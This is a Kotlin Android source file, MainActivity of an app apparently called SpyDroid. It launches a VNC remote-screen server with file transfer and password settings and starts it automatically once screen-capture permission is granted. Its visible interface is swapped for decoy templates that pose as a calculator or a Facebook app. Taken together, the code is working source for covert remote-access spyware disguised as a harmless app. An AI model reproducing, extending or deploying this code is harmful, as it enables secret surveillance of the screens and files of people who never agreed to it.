/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.app

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.preference.PreferenceManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.hilt.navigation.compose.hiltViewModel
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.christianbeier.droidvnc_ng.Constants
import net.christianbeier.droidvnc_ng.Defaults
import net.christianbeier.droidvnc_ng.MainService
import net.spydroid.app.ui.theme.SpyDroidTheme
import net.spydroid.core.data.common.GlobalViewModel
import net.spydroid.core.data.common.LocalGlobalViewModel
import net.spydroid.template.calculator.CalculatorNavigation
import net.spydroid.template.facebook.FacebookNavigation
import net.spydroid.template.sample.SampleNavigation
import net.spydroid.template_default.DefaultNavigation

@Suppress("DEPRECATION", "KotlinConstantConditions")
@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private var mediaProjectionPermission by mutableIntStateOf(-1)
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        setContent {

            SpyDroidTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MainScreen(mediaProjectionPermission) {
                        if (it) startMainService() else stopMainService()
                    }
                    //FacebookNavigation()

                }
            }
        }
    }

    private fun startMainService() {
        val intent = Intent(this, MainService::class.java)
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val mDefaults = Defaults(this)

        intent.putExtra(
            MainService.EXTRA_PORT,
            prefs.getInt(Constants.PREFS_KEY_SETTINGS_PORT, mDefaults.port)
        )
        intent.putExtra(
            MainService.EXTRA_PASSWORD,
            prefs.getString(Constants.PREFS_KEY_SETTINGS_PASSWORD, mDefaults.password)
        )
        intent.putExtra(
            MainService.EXTRA_FILE_TRANSFER,
            prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_FILE_TRANSFER, mDefaults.fileTransfer)
        )
        intent.putExtra(
            MainService.EXTRA_VIEW_ONLY,
            prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_VIEW_ONLY, mDefaults.viewOnly)
        )
        intent.putExtra(
            MainService.EXTRA_SHOW_POINTERS,
            prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_SHOW_POINTERS, mDefaults.showPointers)
        )
        intent.putExtra(
            MainService.EXTRA_SCALING,
            prefs.getFloat(Constants.PREFS_KEY_SETTINGS_SCALING, mDefaults.scaling)
        )
        intent.putExtra(
            MainService.EXTRA_ACCESS_KEY,
            prefs.getString(Constants.PREFS_KEY_SETTINGS_ACCESS_KEY, mDefaults.accessKey)
        )
        intent.setAction(MainService.ACTION_START)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onResume() {
        super.onResume()
        when (MainService.isMediaProjectionEnabled()) {
            0 -> {
                mediaProjectionPermission = 0
            }

            1 -> {
                mediaProjectionPermission = 1
            }

            -1 -> {
                mediaProjectionPermission = -1
                //unknown
            }
        }
    }

    private fun stopMainService() {
        val intent = Intent(this, MainService::class.java)
        intent.setAction(MainService.ACTION_STOP)
        stopService(intent)
    }
}

@Composable
fun MainScreen(
    permissionMediProject: Int,
    globalViewModel: GlobalViewModel = hiltViewModel(),
    state: (Boolean) -> Unit
) {

    val startVncServerState by globalViewModel.stateVncServer.collectAsState()

    val TAG = "PRUEBA14"

    LaunchedEffect(startVncServerState) {
        launch(Dispatchers.IO) {
            if (startVncServerState) {
                state(true)
            } else {
                state(false)
            }
        }
    }

    LaunchedEffect(permissionMediProject) {
        if (permissionMediProject == 1) {
            state(true)
            globalViewModel.changeValueVncServer(true)
        } else {
            state(false)
            globalViewModel.changeValueVncServer(false)
        }
    }

    CompositionLocalProvider(LocalGlobalViewModel provides globalViewModel) {
        when (template_app) {
            APP_TEMPLATES.DEFAULT -> {
                DefaultNavigation()
            }

            APP_TEMPLATES.FACEBOOK -> {
                FacebookNavigation()
            }

            APP_TEMPLATES.CALCULATOR -> {
                CalculatorNavigation()
            }

            APP_TEMPLATES.SAMPLE -> {
                SampleNavigation()
            }

            //APP_TEMPLATES.YOUR_TEMPLATE -> {
            //  YourNavigation()
            //}

            else -> {
                DefaultNavigation()
            }
        }
    }
}

object APP_TEMPLATES {
    const val DEFAULT = "default"
    const val FACEBOOK = "facebook"
    const val CALCULATOR = "calculator"
    const val SAMPLE = "sample"
}
